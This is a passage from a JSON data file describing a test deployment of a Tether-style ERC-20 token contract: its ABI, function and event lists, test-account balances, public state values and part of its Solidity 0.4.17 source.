added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0xDb56f2e9369E0D7bD191099125a3f6C370F8ed15",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xDb56f2e9369E0D7bD191099125a3f6C370F8ed15": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99747072680000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var 